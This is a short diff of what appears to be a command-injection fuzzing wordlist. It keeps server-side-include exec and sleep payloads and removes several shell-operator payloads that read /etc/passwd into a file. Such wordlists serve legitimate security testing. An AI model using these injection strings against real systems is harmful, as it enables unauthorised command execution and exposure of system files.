@@ -42,14 +42,3 @@ echo gaw4f4sdaf12f
 %2560sleep 10%2560
 <!--#exec cmd="echo gaw4f4sdaf12f" -->
 <!--#exec cmd="sleep 10" -->
-;$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-|$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-||$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-&&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
-;cat /etc/passwd > gaw4f4sdaf12f.txt
-|cat /etc/passwd > gaw4f4sdaf12f.txt
-||cat /etc/passwd > gaw4f4sdaf12f.txt
-&cat /etc/passwd > gaw4f4sdaf12f.txt
-&&cat /etc/passwd > gaw4f4sdaf12f.txt
-`cat /etc/passwd > gaw4f4sdaf12f.txt`
